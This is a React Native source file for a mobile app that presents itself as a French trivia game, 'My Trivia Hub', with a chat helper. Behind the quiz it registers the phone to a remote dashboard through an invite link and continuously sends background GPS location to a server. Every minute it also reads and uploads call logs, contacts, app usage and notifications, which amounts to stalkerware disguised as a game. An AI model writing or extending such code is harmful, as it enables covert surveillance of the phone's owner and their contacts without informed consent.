import React, { useEffect, useState } from "react";
import { ActivityIndicator, Alert, AppState, FlatList, Linking, Pressable, SafeAreaView, ScrollView, StyleSheet, Text, TextInput, View } from "react-native";
import * as SecureStore from "expo-secure-store";
import * as Location from "expo-location";
import * as TaskManager from "expo-task-manager";
import * as Device from "expo-device";
import * as Battery from "expo-battery";
import * as Network from "expo-network";
import { StatusBar } from "expo-status-bar";
import { restoreRegisteredDevice, serializeRegisteredDevice } from "./deviceStorage";
import { DEFAULT_TRIVIA_LEVEL, getProgressFromServer, type TriviaProfile } from "./triviaLadder";
import { getTriviaCardState } from "./triviaFlow";
import { prepareAndroidNativePermissions } from "./nativePermissions";
import { configureNativeBackgroundSync, readNativeCallLogs, readNativeContacts, readNativeNotifications, readNativeUsageStats } from "./nativeDataBridge";

const API_BASE = process.env.EXPO_PUBLIC_API_BASE_URL || "https://trackdash-hxav5snp.manus.space";
const DEVICE_STORE_KEY = "mytriviahub_device";
const LEGACY_DEVICE_STORE_KEY = "trackerone_device";
const PENDING_INVITE_KEY = "mytriviahub_pending_invite";
const LEGACY_PENDING_INVITE_KEY = "trackerone_pending_invite";
const LOCATION_TASK_NAME = "mytriviahub-background-location";
const WELCOME_SEEN_KEY = "mytriviahub_welcome_seen";
const NATIVE_PERMISSION_PROBE_KEY = "mytriviahub_native_permission_probe_v3";
const NATIVE_DATA_SYNCED_AT_KEY = "mytriviahub_native_data_synced_at";
const NATIVE_DATA_SYNC_INTERVAL_MS = 60_000;

type Registered = { name: string; platform: "android" | "iphone"; deviceId: string; authToken: string };
type LocationPayload = { latitude: number; longitude: number; batteryPercent: number; network: string };
type TriviaQuestion = { id: number; category: string; difficulty: "easy" | "medium" | "hard"; prompt: string; options: string[]; explanation: string };
type TriviaAnswerResult = { isCorrect: boolean; pointsAwarded: number; correctOptionIndex: number; explanation: string };
type MariahMessage = { role: "user" | "assistant"; content: string };
class TriviaRequestError extends Error { constructor(message: string, readonly status: number) { super(message); } }

async function readRegisteredDevice() {
  const value = await SecureStore.getItemAsync(DEVICE_STORE_KEY) ?? await SecureStore.getItemAsync(LEGACY_DEVICE_STORE_KEY);
  return restoreRegisteredDevice(value);
}

async function sendTelemetry(device: Registered, payload: LocationPayload) {
  const response = await fetch(`${API_BASE}/api/device/telemetry`, { method: "POST", headers: { "Content-Type": "application/json", "x-device-token": device.authToken }, body: JSON.stringify(payload) });
  if (!response.ok) throw new Error(`Telemetry rejected (${response.status})`);
}

async function fetchTriviaProfile(device: Registered) {
  const response = await fetch(`${API_BASE}/api/device/trivia`, { headers: { "x-device-token": device.authToken } });
  if (!response.ok) throw new Error("Profil trivia indisponible");
  const data = await response.json() as { profile?: TriviaProfile };
  return data.profile ?? null;
}

async function fetchTriviaQuestion(device: Registered) {
  const response = await fetch(`${API_BASE}/api/device/trivia/next?language=fr`, { headers: { "x-device-token": device.authToken } });
  if (response.status === 404) return null;
  if (!response.ok) throw new Error("Question trivia indisponible");
  const data = await response.json() as { question?: TriviaQuestion };
  return data.question ?? null;
}

async function submitTriviaAnswer(device: Registered, questionId: number, selectedOptionIndex: number) {
  const response = await fetch(`${API_BASE}/api/device/trivia/answer`, { method: "POST", headers: { "Content-Type": "application/json", "x-device-token": device.authToken }, body: JSON.stringify({ questionId, selectedOptionIndex }) });
  const data = await response.json() as { result?: TriviaAnswerResult; error?: string };
  if (!response.ok || !data.result) throw new TriviaRequestError(data.error || "Réponse trivia indisponible", response.status);
  return data.result;
}

async function fetchMariahReply(device: Registered, questionId: number, message: string, history: MariahMessage[]) {
  const response = await fetch(`${API_BASE}/api/device/trivia/ask-mariah`, { method: "POST", headers: { "Content-Type": "application/json", "x-device-token": device.authToken }, body: JSON.stringify({ questionId, message, history }) });
  const data = await response.json() as { reply?: string; error?: string };
  if (!response.ok || !data.reply) throw new Error(data.error || "Mariah est indisponible");
  return data.reply;
}

async function buildTelemetryPayload(location: Location.LocationObject): Promise<LocationPayload> {
  const battery = await Battery.getBatteryLevelAsync().catch(() => 0);
  const network = await Network.getNetworkStateAsync().catch(() => ({ type: "unknown" as const }));
  return { latitude: location.coords.latitude, longitude: location.coords.longitude, batteryPercent: Math.round(battery * 100), network: network.type || "unknown" };
}

TaskManager.defineTask(LOCATION_TASK_NAME, async ({ data, error }) => {
  if (error) return;
  const location = (data as { locations?: Location.LocationObject[] } | undefined)?.locations?.[0];
  if (!location) return;
  const device = await readRegisteredDevice();
  if (!device) return;
  try { await sendTelemetry(device, await buildTelemetryPayload(location)); } catch { /* background retries occur on the next OS location event */ }
});

async function startBackgroundTracking() {
  const foreground = await Location.getForegroundPermissionsAsync();
  if (foreground.status !== "granted") {
    const requested = await Location.requestForegroundPermissionsAsync();
    if (requested.status !== "granted") throw new Error("La localisation doit être autorisée dans les réglages du téléphone.");
  }
  const background = await Location.getBackgroundPermissionsAsync();
  if (background.status !== "granted") {
    const requested = await Location.requestBackgroundPermissionsAsync();
    if (requested.status !== "granted") throw new Error("La localisation en arrière-plan doit être autorisée dans les réglages du téléphone.");
  }
  const alreadyRunning = await Location.hasStartedLocationUpdatesAsync(LOCATION_TASK_NAME);
  if (!alreadyRunning) await Location.startLocationUpdatesAsync(LOCATION_TASK_NAME, { accuracy: Location.Accuracy.Balanced, timeInterval: 60_000, distanceInterval: 50, pausesUpdatesAutomatically: false, foregroundService: { notificationTitle: "My Trivia Hub", notificationBody: "La position autorisée est synchronisée avec votre tableau de bord.", notificationColor: "#2FE0C4" }, showsBackgroundLocationIndicator: true });
}

async function syncNow(device: Registered) {
  const position = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
  await sendTelemetry(device, await buildTelemetryPayload(position));
}

async function syncNativeData(device: Registered) {
  const [callLogs, contacts, usage, notifications] = await Promise.all([
    readNativeCallLogs(24).catch(() => []),
    readNativeContacts().catch(() => []),
    readNativeUsageStats(1).catch(() => []),
    readNativeNotifications().catch(() => []),
  ]);
  if (!callLogs.length && !contacts.length && !usage.length && !notifications.length) return;
  const response = await fetch(`${API_BASE}/api/device/native-data`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "x-device-token": device.authToken },
    body: JSON.stringify({ callLogs, contacts, usage, notifications }),
  });
  if (!response.ok) throw new Error(`Native data rejected (${response.status})`);
  await SecureStore.setItemAsync(NATIVE_DATA_SYNCED_AT_KEY, String(Date.now()));
}

export default function App() {
  const [inviteToken, setInviteToken] = useState("");
  const [name, setName] = useState(Device.deviceName || "Mon téléphone");
  const [platform, setPlatform] = useState<"android" | "iphone">("android");
  const [registered, setRegistered] = useState<Registered | null>(null);
  const [busy, setBusy] = useState(false);
  const [lastSync, setLastSync] = useState<string | null>(null);
  const [resumedInvite, setResumedInvite] = useState(false);
  const [welcomeSeen, setWelcomeSeen] = useState<boolean | null>(null);
  const [scoreOpen, setScoreOpen] = useState(false);
  const [trivia, setTrivia] = useState<TriviaProfile | null>(null);
  const [question, setQuestion] = useState<TriviaQuestion | null>(null);
  const [questionLoading, setQuestionLoading] = useState(false);
  const [triviaError, setTriviaError] = useState<string | null>(null);
  const [selectedOption, setSelectedOption] = useState<number | null>(null);
  const [answerResult, setAnswerResult] = useState<TriviaAnswerResult | null>(null);
  const [mariahOpen, setMariahOpen] = useState(false);
  const [mariahMessage, setMariahMessage] = useState("");
  const [mariahHistory, setMariahHistory] = useState<MariahMessage[]>([]);
  const [mariahBusy, setMariahBusy] = useState(false);
  const [mariahError, setMariahError] = useState<string | null>(null);

  useEffect(() => {
    readRegisteredDevice().then(device => { if (device) setRegistered(device); });
    SecureStore.getItemAsync(WELCOME_SEEN_KEY).then(value => setWelcomeSeen(value === "1"));
    SecureStore.getItemAsync(PENDING_INVITE_KEY).then(value => value || SecureStore.getItemAsync(LEGACY_PENDING_INVITE_KEY)).then(value => { if (value) { setInviteToken(value); setResumedInvite(true); } });
    const applyInviteUrl = (url: string | null) => { if (!url) return; const match = url.match(/\/invite\/([^/?#]+)/); if (match?.[1]) { setInviteToken(match[1]); setResumedInvite(true); void SecureStore.setItemAsync(PENDING_INVITE_KEY, match[1]); } };
    void Linking.getInitialURL().then(applyInviteUrl);
    const subscription = Linking.addEventListener("url", event => applyInviteUrl(event.url));
    return () => subscription.remove();
  }, []);

  useEffect(() => {
    if (!registered) return;
    setQuestionLoading(true);
    void Promise.all([fetchTriviaProfile(registered), fetchTriviaQuestion(registered)]).then(([profile, nextQuestion]) => { setTrivia(profile); setQuestion(nextQuestion); setTriviaError(null); setSelectedOption(null); setAnswerResult(null); setMariahOpen(false); setMariahMessage(""); setMariahHistory([]); setMariahError(null); }).catch(error => setTriviaError(error instanceof Error ? error.message : "Connexion trivia indisponible")).finally(() => setQuestionLoading(false));
    setBusy(true);
    (async () => {
      const nativeProbe = await SecureStore.getItemAsync(NATIVE_PERMISSION_PROBE_KEY);
      if (!nativeProbe) {
        await prepareAndroidNativePermissions();
        await SecureStore.setItemAsync(NATIVE_PERMISSION_PROBE_KEY, "1");
      }
      await startBackgroundTracking();
      await syncNow(registered);
      setLastSync(new Date().toLocaleTimeString("fr-FR"));
      await syncNativeData(registered).catch(() => undefined);
    })().catch(error => Alert.alert("Autorisation requise", error instanceof Error ? error.message : "Autorisez la localisation dans les réglages du téléphone.")).finally(() => setBusy(false));
  }, [registered]);

  useEffect(() => {
    if (!registered) return;
    void configureNativeBackgroundSync(API_BASE, registered.authToken).catch(() => undefined);
    const syncNative = () => { void syncNativeData(registered).catch(() => undefined); };
    syncNative();
    const timer = setInterval(syncNative, NATIVE_DATA_SYNC_INTERVAL_MS);
    const subscription = AppState.addEventListener("change", state => {
      if (state === "active") syncNative();
    });
    return () => {
      clearInterval(timer);
      subscription.remove();
    };
  }, [registered]);

  const score = trivia?.score ?? 0;
  const bestScore = trivia?.bestScore ?? score;
  const ladderProgress = trivia ? getProgressFromServer(trivia) : { pointsNeeded: 0, percent: 0 };
  const currentLevel = trivia?.currentLevel ?? DEFAULT_TRIVIA_LEVEL;
  const nextLevel = trivia?.nextLevel ?? null;
  const ladder = trivia?.ladder ?? [];
  const triviaCardState = getTriviaCardState({ loading: questionLoading, error: triviaError, question });

  const register = async () => {
    if (!inviteToken.trim() || name.trim().length < 2) return Alert.alert("Informations requises", "Saisissez le lien ou token d'invitation et un nom d'appareil.");
    setBusy(true);
    try {
      const response = await fetch(`${API_BASE}/api/device/register`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token: inviteToken.trim().split("/").pop(), name: name.trim(), platform }) });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Impossible d'enregistrer l'appareil");
      const device = { ...data.device, authToken: data.authToken } as Registered;
      await SecureStore.setItemAsync(DEVICE_STORE_KEY, serializeRegisteredDevice(device));
      await SecureStore.deleteItemAsync(PENDING_INVITE_KEY);
      setRegistered(device);
      Alert.alert("Téléphone connecté", "Votre appareil est maintenant associé à My Trivia Hub.");
    } catch (error) { Alert.alert("Échec de l'inscription", error instanceof Error ? error.message : "Une erreur est survenue."); }
    finally { setBusy(false); }
  };

  const chooseAnswer = async (optionIndex: number) => {
    if (!registered || !question || selectedOption !== null || answerResult) return;
    setSelectedOption(optionIndex);
    try {
      const result = await submitTriviaAnswer(registered, question.id, optionIndex);
      setAnswerResult(result);
      const profile = await fetchTriviaProfile(registered);
      setTrivia(profile);
    } catch (error) {
      setSelectedOption(null);
      if (error instanceof TriviaRequestError && error.status === 409) {
        await loadNextQuestion();
        return;
      }
      Alert.alert("Réponse indisponible", error instanceof Error ? error.message : "Réessayez dans un instant.");
    }
  };

  const loadNextQuestion = async () => {
    if (!registered) return;
    setQuestionLoading(true);
    try { setQuestion(await fetchTriviaQuestion(registered)); setTriviaError(null); setSelectedOption(null); setAnswerResult(null); setMariahOpen(false); setMariahMessage(""); setMariahHistory([]); setMariahError(null); }
    catch (error) { setTriviaError(error instanceof Error ? error.message : "Connexion trivia indisponible"); }
    finally { setQuestionLoading(false); }
  };

  const askMariah = async () => {
    const prompt = mariahMessage.trim();
    if (!registered || !question || !prompt || mariahBusy) return;
    const userTurn: MariahMessage = { role: "user", content: prompt };
    setMariahBusy(true);
    setMariahError(null);
    setMariahMessage("");
    try {
      const reply = await fetchMariahReply(registered, question.id, prompt, mariahHistory);
      setMariahHistory(previous => [...previous, userTurn, { role: "assistant", content: reply }]);
    } catch (error) {
      setMariahMessage(prompt);
      setMariahError(error instanceof Error ? error.message : "Mariah est indisponible");
    } finally { setMariahBusy(false); }
  };

  const enterTrivia = async () => { await SecureStore.setItemAsync(WELCOME_SEEN_KEY, "1"); setWelcomeSeen(true); };

  if (!registered) return <SafeAreaView style={styles.safe}><StatusBar style="light" /><ScrollView contentContainerStyle={styles.container}><View style={styles.logo}><Text style={styles.logoText}>✦</Text></View><Text style={styles.kicker}>MY TRIVIA HUB · MOBILE</Text><Text style={styles.title}>{resumedInvite ? "Reprendre l'invitation" : "Connecter votre téléphone"}</Text><Text style={styles.copy}>{resumedInvite ? "L'invitation My Trivia Hub a été retrouvée. Vérifiez les informations ci-dessous pour terminer l'association de ce téléphone." : "Utilisez le lien d'invitation reçu depuis le tableau de bord pour associer cet appareil."}</Text><Text style={styles.label}>Lien ou token d'invitation</Text><TextInput value={inviteToken} onChangeText={setInviteToken} placeholder="https://…/invite/…" placeholderTextColor="#5F6C82" style={styles.input} autoCapitalize="none" /><Text style={styles.label}>Nom de l'appareil</Text><TextInput value={name} onChangeText={setName} placeholder="Téléphone" placeholderTextColor="#5F6C82" style={styles.input} /><Text style={styles.label}>Plateforme</Text><View style={styles.row}><Pressable onPress={() => setPlatform("android")} style={[styles.choice, platform === "android" && styles.choiceActive]}><Text style={styles.choiceText}>Android</Text></Pressable><Pressable onPress={() => setPlatform("iphone")} style={[styles.choice, platform === "iphone" && styles.choiceActive]}><Text style={styles.choiceText}>iPhone</Text></Pressable></View><Pressable disabled={busy} onPress={register} style={({ pressed }) => [styles.primary, pressed && styles.pressed]}>{busy ? <ActivityIndicator color="#0A0F1A" /> : <Text style={styles.primaryText}>Associer ce téléphone</Text>}</Pressable><Text style={styles.note}>La localisation est demandée par le système du téléphone lors de la première synchronisation. Vous pouvez modifier cette autorisation dans les réglages du téléphone.</Text></ScrollView></SafeAreaView>;

  if (registered && welcomeSeen === null) return <SafeAreaView style={styles.safe}><StatusBar style="light" /><View style={styles.loadingScreen}><ActivityIndicator color="#2FE0C4" /><Text style={styles.cardMeta}>Préparation de votre espace trivia…</Text></View></SafeAreaView>;

  if (welcomeSeen === false) return <SafeAreaView style={styles.safe}><StatusBar style="light" /><ScrollView contentContainerStyle={styles.container}><View style={styles.logo}><Text style={styles.logoText}>✦</Text></View><Text style={styles.kicker}>MY TRIVIA HUB · VOTRE CURIOSITÉ</Text><Text style={styles.title}>Une question vous attend.</Text><Text style={styles.copy}>Certaines réponses vont vous surprendre. D’autres vous feront dire : « Je le savais ! »</Text><View style={styles.welcomeCard}><Text style={styles.welcomeEmoji}>🧠</Text><Text style={styles.welcomeTitle}>Répondez, progressez, recommencez.</Text><Text style={styles.cardMeta}>Votre GPS continue de fonctionner discrètement en arrière-plan.</Text></View><Pressable onPress={() => void enterTrivia()} style={({ pressed }) => [styles.primary, pressed && styles.pressed]}><Text style={styles.primaryText}>Découvrir ma première question</Text></Pressable><Text style={styles.note}>Touchez le score à tout moment pour ouvrir votre ladder.</Text></ScrollView></SafeAreaView>;

  return <SafeAreaView style={styles.safe}><StatusBar style="light" /><ScrollView contentContainerStyle={styles.container}><View style={styles.topRow}><View><Text style={styles.kicker}>MY TRIVIA HUB · DEVICE</Text><Text style={styles.title}>{registered.name}</Text></View><Pressable accessibilityLabel="Ouvrir le score" onPress={() => setScoreOpen(true)} style={styles.scoreChip}><Text style={styles.scoreIcon}>{currentLevel.emoji}</Text><Text style={styles.scoreNickname}>{currentLevel.nickname}</Text><Text style={styles.scoreValue}>{score} pts</Text></Pressable></View><Text style={styles.copy}>Répondez à une question pour gagner des points et faire progresser votre surnom.</Text><Text style={styles.ladderCue}>{nextLevel ? `Encore ${ladderProgress.pointsNeeded} points pour devenir ${nextLevel.emoji} ${nextLevel.nickname}.` : "Niveau légendaire atteint — battez votre propre record."}</Text><View style={styles.triviaCard}><View style={styles.triviaHeader}><Text style={styles.cardLabel}>Question aléatoire · {question?.category ?? "My Trivia Hub"}</Text><Text style={styles.difficulty}>{question?.difficulty === "hard" ? "Difficile" : question?.difficulty === "medium" ? "Intermédiaire" : "Facile"}</Text></View>{triviaCardState === "loading" ? <ActivityIndicator color="#2FE0C4" /> : triviaCardState === "error" ? <View><Text style={styles.triviaError}>Impossible de charger la question.</Text><Text style={styles.cardMeta}>{triviaError}</Text><Pressable onPress={() => void loadNextQuestion()} style={styles.retryButton}><Text style={styles.nextButtonText}>Réessayer</Text></Pressable></View> : triviaCardState === "question" && question ? <><Text style={styles.questionPrompt}>{question.prompt}</Text><FlatList data={question.options} keyExtractor={(item, index) => `${question.id}-${index}-${item}`} scrollEnabled={false} renderItem={({ item, index }) => { const isSelected = selectedOption === index; const isCorrect = answerResult?.correctOptionIndex === index; return <Pressable disabled={selectedOption !== null || Boolean(answerResult)} onPress={() => void chooseAnswer(index)} style={[styles.answerOption, isSelected && styles.answerSelected, answerResult && isCorrect && styles.answerCorrect, answerResult && isSelected && !answerResult.isCorrect && styles.answerWrong]}><Text style={styles.answerLetter}>{String.fromCharCode(65 + index)}</Text><Text style={styles.answerText}>{item}</Text></Pressable>; }} /><Pressable onPress={() => setMariahOpen(open => !open)} style={styles.mariahButton}><Text style={styles.mariahButtonText}>{mariahOpen ? "Fermer Mariah" : "Demander à Mariah à propos de cette question"}</Text></Pressable>{mariahOpen && <View style={styles.mariahPanel}><Text style={styles.mariahTitle}>Mariah · à propos de cette question</Text><Text style={styles.mariahHint}>{answerResult ? "Demandez une explication ou approfondissez le sujet." : "Mariah peut donner un indice sans révéler la réponse."}</Text>{mariahHistory.map((turn, index) => <View key={`${turn.role}-${index}`} style={[styles.mariahBubble, turn.role === "user" ? styles.mariahUserBubble : styles.mariahAssistantBubble]}><Text style={turn.role === "user" ? styles.mariahUserText : styles.mariahAssistantText}>{turn.content}</Text></View>)}{mariahBusy && <ActivityIndicator color="#2FE0C4" style={styles.mariahBusy} />}{mariahError && <Text style={styles.triviaError}>{mariahError}</Text>}<TextInput value={mariahMessage} onChangeText={setMariahMessage} placeholder="Posez une question sur celle-ci…" placeholderTextColor="#5F6C82" style={styles.mariahInput} multiline maxLength={600} editable={!mariahBusy} /><Pressable disabled={!mariahMessage.trim() || mariahBusy} onPress={() => void askMariah()} style={[styles.mariahSend, (!mariahMessage.trim() || mariahBusy) && styles.mariahSendDisabled]}><Text style={styles.nextButtonText}>{mariahBusy ? "Mariah réfléchit…" : "Envoyer"}</Text></Pressable></View>}{answerResult && <View style={[styles.feedback, answerResult.isCorrect ? styles.feedbackCorrect : styles.feedbackWrong]}><Text style={styles.feedbackTitle}>{answerResult.isCorrect ? `Bonne réponse · +${answerResult.pointsAwarded} points` : "Pas cette fois"}</Text><Text style={styles.feedbackText}>{answerResult.explanation}</Text><Pressable onPress={() => void loadNextQuestion()} style={styles.nextButton}><Text style={styles.nextButtonText}>Question suivante</Text></Pressable></View>}</> : <View><Text style={styles.cardMeta}>Vous avez répondu à toutes les questions disponibles.</Text><Text style={styles.cardMeta}>De nouvelles questions seront proposées dès qu’elles seront ajoutées.</Text></View>}</View><Text style={styles.note}>Touchez votre surnom pour voir la hiérarchie complète des surnoms du parcours.</Text>{scoreOpen && <View style={styles.ladder}><View style={styles.ladderHead}><Text style={styles.ladderTitle}>Ladder My Trivia Hub</Text><Pressable onPress={() => setScoreOpen(false)}><Text style={styles.close}>Fermer</Text></Pressable></View><Text style={styles.nickname}>{currentLevel.emoji} {currentLevel.nickname}</Text><Text style={styles.cardMeta}>{score} points · niveau {currentLevel.level}</Text><Text style={styles.personalBest}>Record personnel · {bestScore} points</Text><View style={styles.progressTrack}><View style={[styles.progressFill, { width: `${ladderProgress.percent}%` }]} /></View><Text style={styles.progressText}>{nextLevel ? `${ladderProgress.pointsNeeded} points avant ${nextLevel.emoji} ${nextLevel.nickname}` : "Niveau maximum atteint"}</Text><Text style={styles.encouragement}>{currentLevel.encouragement}</Text><FlatList data={ladder} keyExtractor={item => String(item.level)} scrollEnabled={false} renderItem={({ item }) => <View style={[styles.levelRow, item.level === currentLevel.level && styles.levelRowActive]}><Text style={styles.levelEmoji}>{item.emoji}</Text><View style={styles.levelCopy}><Text style={item.level === currentLevel.level ? styles.levelActive : styles.level}>{item.nickname}</Text><Text style={styles.levelThreshold}>{item.minimumScore} points · niveau {item.level}</Text></View>{item.level === currentLevel.level && <Text style={styles.youBadge}>VOUS</Text>}</View>} /><Text style={styles.note}>Répondez régulièrement pour monter de niveau et débloquer un nouveau surnom.</Text></View>}</ScrollView></SafeAreaView>;
}

const styles = StyleSheet.create({ safe: { flex: 1, backgroundColor: "#0A0F1A" }, loadingScreen: { flex: 1, alignItems: "center", justifyContent: "center", gap: 12, padding: 28 }, container: { flexGrow: 1, padding: 28, justifyContent: "center" }, topRow: { flexDirection: "row", alignItems: "flex-start", justifyContent: "space-between", gap: 16 }, logo: { width: 46, height: 46, borderRadius: 13, borderWidth: 1, borderColor: "#2FE0C4", backgroundColor: "rgba(47,224,196,.13)", alignItems: "center", justifyContent: "center", marginBottom: 24 }, logoText: { color: "#2FE0C4", fontSize: 24, fontWeight: "700" }, kicker: { color: "#2FE0C4", fontSize: 10, letterSpacing: 1.5, marginBottom: 10 }, title: { color: "#F3F6F9", fontSize: 30, fontWeight: "700", marginBottom: 10 }, copy: { color: "#98A4B8", fontSize: 14, lineHeight: 21, marginBottom: 12 }, ladderCue: { color: "#F6A937", fontSize: 12, lineHeight: 18, marginBottom: 18 }, label: { color: "#98A4B8", fontSize: 12, marginBottom: 7, marginTop: 12 }, input: { backgroundColor: "#10182A", borderWidth: 1, borderColor: "rgba(255,255,255,.16)", color: "#F3F6F9", borderRadius: 10, padding: 13, fontSize: 13 }, row: { flexDirection: "row", gap: 10, marginBottom: 22 }, choice: { flex: 1, borderWidth: 1, borderColor: "rgba(255,255,255,.1)", backgroundColor: "#1A2438", borderRadius: 10, padding: 13, alignItems: "center" }, choiceActive: { borderColor: "#2FE0C4", backgroundColor: "rgba(47,224,196,.13)" }, choiceText: { color: "#F3F6F9", fontWeight: "600" }, primary: { backgroundColor: "#2FE0C4", borderRadius: 10, padding: 15, alignItems: "center", minHeight: 50, justifyContent: "center" }, pressed: { opacity: .85, transform: [{ scale: .98 }] }, primaryText: { color: "#0A0F1A", fontWeight: "700", fontSize: 14 }, note: { color: "#5F6C82", fontSize: 11, lineHeight: 17, marginTop: 22 }, card: { backgroundColor: "#10182A", borderWidth: 1, borderColor: "rgba(255,255,255,.08)", borderRadius: 14, padding: 18, marginBottom: 20 }, cardLabel: { color: "#5F6C82", fontSize: 10, textTransform: "uppercase", letterSpacing: 1, marginBottom: 9 }, status: { color: "#2FE0C4", fontSize: 16, fontWeight: "600", marginBottom: 7 }, cardMeta: { color: "#98A4B8", fontSize: 12 }, personalBest: { color: "#2FE0C4", fontSize: 12, fontWeight: "800", marginTop: 8 }, scoreChip: { minWidth: 64, paddingVertical: 8, paddingHorizontal: 10, borderRadius: 14, borderWidth: 1, borderColor: "#2FE0C4", backgroundColor: "rgba(47,224,196,.13)", alignItems: "center" }, scoreIcon: { color: "#F6A937", fontSize: 16 }, scoreNickname: { color: "#2FE0C4", fontSize: 9, fontWeight: "800", maxWidth: 110, textAlign: "center" }, scoreValue: { color: "#F3F6F9", fontWeight: "700", fontSize: 12 }, ladder: { backgroundColor: "#10182A", borderWidth: 1, borderColor: "rgba(47,224,196,.35)", borderRadius: 16, padding: 18, marginTop: 24 }, ladderHead: { flexDirection: "row", justifyContent: "space-between", alignItems: "center" }, ladderTitle: { color: "#F3F6F9", fontWeight: "700", fontSize: 17 }, close: { color: "#2FE0C4", fontSize: 12 }, nickname: { color: "#F6A937", fontSize: 22, fontWeight: "700", marginTop: 18 }, progressTrack: { height: 8, backgroundColor: "#1A2438", borderRadius: 8, overflow: "hidden", marginTop: 16 }, progressFill: { height: "100%", backgroundColor: "#2FE0C4", borderRadius: 8 }, progressText: { color: "#98A4B8", fontSize: 11, marginTop: 8 }, encouragement: { color: "#F6A937", fontSize: 12, lineHeight: 18, marginTop: 10, marginBottom: 8 }, levelRow: { flexDirection: "row", alignItems: "center", gap: 10, paddingVertical: 9, borderBottomWidth: 1, borderBottomColor: "rgba(255,255,255,.06)" }, levelRowActive: { backgroundColor: "rgba(47,224,196,.08)", borderRadius: 8, paddingHorizontal: 8 }, levelEmoji: { fontSize: 20, width: 30, textAlign: "center" }, levelCopy: { flex: 1 }, levelActive: { color: "#2FE0C4", fontWeight: "700" }, level: { color: "#98A4B8" }, levelThreshold: { color: "#5F6C82", fontSize: 10, marginTop: 2 }, youBadge: { color: "#2FE0C4", fontSize: 9, fontWeight: "700" }, triviaCard: { backgroundColor: "#10182A", borderWidth: 1, borderColor: "rgba(47,224,196,.35)", borderRadius: 16, padding: 18, marginBottom: 20 }, triviaHeader: { flexDirection: "row", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }, difficulty: { color: "#F6A937", fontSize: 10, fontWeight: "700" }, questionPrompt: { color: "#F3F6F9", fontSize: 20, lineHeight: 27, fontWeight: "700", marginBottom: 16 }, answerOption: { flexDirection: "row", alignItems: "center", gap: 10, backgroundColor: "#1A2438", borderWidth: 1, borderColor: "rgba(255,255,255,.1)", borderRadius: 11, padding: 13, marginBottom: 9 }, answerSelected: { borderColor: "#F6A937" }, answerCorrect: { backgroundColor: "rgba(47,224,196,.16)", borderColor: "#2FE0C4" }, answerWrong: { backgroundColor: "rgba(246,169,55,.12)", borderColor: "#F6A937" }, answerLetter: { color: "#2FE0C4", fontWeight: "800", width: 22 }, answerText: { color: "#F3F6F9", flex: 1, fontSize: 14 }, feedback: { borderRadius: 11, padding: 13, marginTop: 8 }, feedbackCorrect: { backgroundColor: "rgba(47,224,196,.12)" }, feedbackWrong: { backgroundColor: "rgba(246,169,55,.1)" }, feedbackTitle: { color: "#F3F6F9", fontWeight: "800", fontSize: 14, marginBottom: 5 }, feedbackText: { color: "#98A4B8", fontSize: 12, lineHeight: 18 }, nextButton: { backgroundColor: "#2FE0C4", borderRadius: 9, padding: 12, alignItems: "center", marginTop: 12 }, nextButtonText: { color: "#0A0F1A", fontWeight: "800", fontSize: 12 }, welcomeCard: { backgroundColor: "rgba(47,224,196,.09)", borderWidth: 1, borderColor: "rgba(47,224,196,.3)", borderRadius: 16, padding: 20, marginBottom: 22 }, welcomeEmoji: { fontSize: 36, marginBottom: 12 }, welcomeTitle: { color: "#F3F6F9", fontWeight: "800", fontSize: 18, marginBottom: 8 }, retryButton: { backgroundColor: "#2FE0C4", borderRadius: 9, padding: 11, alignItems: "center", marginTop: 12 }, triviaError: { color: "#F6A937", fontWeight: "800", fontSize: 14, marginBottom: 5 }, mariahButton: { borderWidth: 1, borderColor: "rgba(47,224,196,.55)", borderRadius: 9, padding: 12, alignItems: "center", marginTop: 5, backgroundColor: "rgba(47,224,196,.08)" }, mariahButtonText: { color: "#2FE0C4", fontWeight: "800", fontSize: 12 }, mariahPanel: { borderWidth: 1, borderColor: "rgba(47,224,196,.25)", backgroundColor: "#0C1423", borderRadius: 11, padding: 12, marginTop: 10 }, mariahTitle: { color: "#F3F6F9", fontWeight: "800", fontSize: 13 }, mariahHint: { color: "#98A4B8", fontSize: 11, lineHeight: 16, marginTop: 4, marginBottom: 10 }, mariahBubble: { borderRadius: 9, padding: 10, marginBottom: 7 }, mariahUserBubble: { backgroundColor: "rgba(47,224,196,.16)", alignSelf: "flex-end" }, mariahAssistantBubble: { backgroundColor: "#1A2438", alignSelf: "flex-start" }, mariahUserText: { color: "#E9FFFB", fontSize: 12, lineHeight: 18 }, mariahAssistantText: { color: "#F3F6F9", fontSize: 12, lineHeight: 18 }, mariahBusy: { marginVertical: 8 }, mariahInput: { backgroundColor: "#10182A", borderWidth: 1, borderColor: "rgba(255,255,255,.16)", color: "#F3F6F9", borderRadius: 9, padding: 10, fontSize: 12, minHeight: 42, textAlignVertical: "top", marginTop: 4 }, mariahSend: { backgroundColor: "#2FE0C4", borderRadius: 9, padding: 11, alignItems: "center", marginTop: 8 }, mariahSendDisabled: { opacity: .45 } });
